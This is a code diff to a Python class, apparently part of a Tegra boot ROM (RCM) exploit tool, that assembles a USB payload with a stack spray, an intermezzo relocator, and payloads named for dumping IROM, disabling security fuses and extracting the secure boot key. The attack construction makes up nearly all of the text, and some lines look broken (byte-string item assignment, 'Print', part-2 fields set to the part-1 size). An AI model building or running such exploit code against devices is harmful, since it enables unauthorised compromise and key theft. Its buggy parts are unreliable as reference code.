@@ -129,89 +129,104 @@ class RCMHax(ABC):
 
 
 ######## DECIDE IF INTERMEZZO IS NEEDED ########################################
-	#payload_path = "./payloads/dump_irom.bin"
+        #payload_path = "./payloads/dump_irom.bin"
         #payload_path = "./disable_security_fuses.bin"
         payload_path = "./payloads/patch_irom.bin"
+        #payload_path = "./payloads/dump-sbk-via-usb.bin"
         #payload_path = "uart_payload_n7.bin"
         with open(payload_path, "rb") as f:
             payload      = f.read()
 
-	if len(payload) < self.STACK_SPRAY_START:
-		# skip intermezzo
-		rcm_payload = payload
-	elif (IRAM_END - self.RCM_PAYLOAD_ADDR - self.PAYLOAD_START_OFF - (self.STACK_SPRAY_END - self.STACK_SPRAY_START)):
-		# The RCM payload needs to contain the stackspray and therefore the actual payload eventually needs to be splitted.
-		# Intermezzo will concat it back together
-		# Calc sizes for indidual parts
-		payload_part1_max_size = self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1] - self.PAYLOAD_START_OFF
-		payload_part2_max_size = (IRAM_END - self.RCM_PAYLOAD_ADDR) - (self.STACK_SPRAY_END - self.COPY_BUFFER_ADDRESSES[1])
-
-		# Check if payload fits in the available space
-		print(payload_part1_max_size)
-		print(payload_part2_max_size)
-		print(payload_part1_max_size+payload_part2_max_size)
-		assert(len(payload) < (payload_part1_max_size+payload_part2_max_size))
-######## INTERMEZZO ############################################################
-		# This is the start of the RCM payload buffer.
-		intermezzo_path = "./intermezzo.bin"
-		intermezzo_path = "./payloads/patch_irom.bin"
-		with open(intermezzo_path, "rb") as f:
-		    intermezzo      = f.read()
-
-######## PATCH INTERMEZZO ######################################################
-		# Intermezzo relocation address
-		intermezzo[0x100] = (self.RCM_PAYLOAD_ADDR-0x1000).to_bytes(4, byteorder='little')
-
-		# Payload Entry point
-		intermezzo[0x104] = (self.RCM_PAYLOAD_ADDR).to_bytes(4, byteorder='little')
-
-		# Payload start offset
-		intermezzo[0x108] = (self.RCM_PAYLOAD_ADDR+self.PAYLOAD_START_OFF).to_bytes(4, byteorder='little')
-
-		# Payload Part 1 size
-		intermezzo[0x10C] = payload_part1_max_size.to_bytes(4, byteorder='little')
-
-		# Start of Payload Part 2
-		intermezzo[0x110] = payload_part1_max_size.to_bytes(4, byteorder='little')
-
-		# Payload Part 2 size
-		intermezzo[0x114] = payload_part1_max_size.to_bytes(4, byteorder='little')
-
-		rcm_payload     = intermezzo
-######## PAD UNTIL PAYLOAD ADDRESS #############################################
-		# Payload should start at a fixed offset so pad until that offset.
-		padding_size = self.PAYLOAD_START_OFF - len(rcm_payload)
-		padding = b'\0' * padding_size
-		rcm_payload += padding
-
-######## APPEND 1st PART OF PAYLOAD ############################################
-		# append first part of payload if payload is larger than the available buffer
-		payload_size = min(payload_part1_max_size, len(payload))
-		rcm_payload += payload[:payload_size]
-
+        if len(payload) < self.STACK_SPRAY_START:
+            print("payload without intermezzo");
+            # skip intermezzo
+            rcm_payload = payload
+            
 ######## PAD UNTIL STACK SPRAY ADDRESS #########################################
-		assert((self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]) - len(rcm_payload) == 0)
+            padding_size = (self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]) - len(rcm_payload) #+ self.RCM_HEADER_SIZE
+            padding = b'\0' * padding_size
+            rcm_payload += padding
 
 ######## STACK SPRAY ADDRESS ###################################################
-		repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
-		stack_spray = (self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
-		rcm_payload += stack_spray
+            repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
+            stack_spray = (self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
+            rcm_payload += stack_spray
+            
+        elif (IRAM_END - self.RCM_PAYLOAD_ADDR - self.PAYLOAD_START_OFF - (self.STACK_SPRAY_END - self.STACK_SPRAY_START)):
+            # The RCM payload needs to contain the stackspray and therefore the actual payload eventually needs to be splitted.
+            # Intermezzo will concat it back together
+            # Calc sizes for indidual parts
+            payload_part1_max_size = self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1] - self.PAYLOAD_START_OFF
+            payload_part2_max_size = (IRAM_END - self.RCM_PAYLOAD_ADDR) - (self.STACK_SPRAY_END - self.COPY_BUFFER_ADDRESSES[1])
+
+            # Check if payload fits in the available space
+            print(payload_part1_max_size)
+            print(payload_part2_max_size)
+            print(payload_part1_max_size+payload_part2_max_size)
+            assert(len(payload) < (payload_part1_max_size+payload_part2_max_size))
+######## INTERMEZZO ############################################################
+            # This is the start of the RCM payload buffer.
+            intermezzo_path = "./intermezzo.bin"
+            intermezzo_path = "./payloads/patch_irom.bin"
+            with open(intermezzo_path, "rb") as f:
+                intermezzo      = f.read()
+
+######## PATCH INTERMEZZO ######################################################
+            # Intermezzo relocation address
+            intermezzo[0x100] = (self.RCM_PAYLOAD_ADDR-0x1000).to_bytes(4, byteorder='little')
+
+            # Payload Entry point
+            intermezzo[0x104] = (self.RCM_PAYLOAD_ADDR).to_bytes(4, byteorder='little')
+
+            # Payload start offset
+            intermezzo[0x108] = (self.RCM_PAYLOAD_ADDR+self.PAYLOAD_START_OFF).to_bytes(4, byteorder='little')
+
+            # Payload Part 1 size
+            intermezzo[0x10C] = payload_part1_max_size.to_bytes(4, byteorder='little')
+
+            # Start of Payload Part 2
+            intermezzo[0x110] = payload_part1_max_size.to_bytes(4, byteorder='little')
+
+            # Payload Part 2 size
+            intermezzo[0x114] = payload_part1_max_size.to_bytes(4, byteorder='little')
+
+            rcm_payload     = intermezzo
+            
+            f_intermezzo_patched = open("intermezzo_patched.bin", "wb")
+            f_intermezzo_patched.write(intermezzo)
+######## PAD UNTIL PAYLOAD ADDRESS #############################################
+            # Payload should start at a fixed offset so pad until that offset.
+            padding_size = self.PAYLOAD_START_OFF - len(rcm_payload)
+            padding = b'\0' * padding_size
+            rcm_payload += padding
+
+######## APPEND 1st PART OF PAYLOAD ############################################
+            # append first part of payload if payload is larger than the available buffer
+            payload_size = min(payload_part1_max_size, len(payload))
+            rcm_payload += payload[:payload_size]
+
+######## PAD UNTIL STACK SPRAY ADDRESS #########################################
+            assert((self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]) - len(rcm_payload) == 0)
+
+######## STACK SPRAY ADDRESS ###################################################
+            repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
+            stack_spray = (self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
+            rcm_payload += stack_spray
 
 ######## APPEND 2nd PART OF PAYLOAD ############################################
-		assert(len(payload) - payload_part1_max_size > 0)
-		rcm_payload += payload[payload_size:]
-	else:
-		Print("Payload too large :(")
-		assert(0)
+            assert(len(payload) - payload_part1_max_size > 0)
+            rcm_payload += payload[payload_size:]
+        else:
+            Print("Payload too large :(")
+            assert(0)
 
 ######## PAD TO USB_XFER_MAX ###################################################
-	# Pad the payload to fill a USB request exactly, so we don't send a short
-	# packet and break out of the RCM loop.
-	payload_length = len(rcm_header + rcm_payload) #pad the RCM message full USb buffer.
-	if (payload_length % USB_XFER_MAX) != 0: #don't pad if we already end at correct alignment
-	    padding_size   = USB_XFER_MAX - (payload_length % USB_XFER_MAX)
-	    rcm_payload += (b'\0' * padding_size)
-
+        # Pad the payload to fill a USB request exactly, so we don't send a short
+        # packet and lose track of the usb USB DMA buffer.
+        payload_length = len(rcm_header + rcm_payload) #pad the RCM message full USb buffer.
+        if (payload_length % USB_XFER_MAX) != 0: #don't pad if we already end at correct alignment
+            padding_size   = USB_XFER_MAX - (payload_length % USB_XFER_MAX)
+            rcm_payload += (b'\0' * padding_size)
 
         rcm_message = rcm_header + rcm_payload
 
@@ -222,7 +237,5 @@ class RCMHax(ABC):
         f_rcm_header.write(rcm_header)
         f_rcm_payload = open("rcm_payload.bin", "wb")
         f_rcm_payload.write(rcm_payload)
-        f_intermezzo_patched = open("intermezzo_patched.bin", "wb")
-        f_intermezzo_patched.write(intermezzo)
 
         return rcm_message
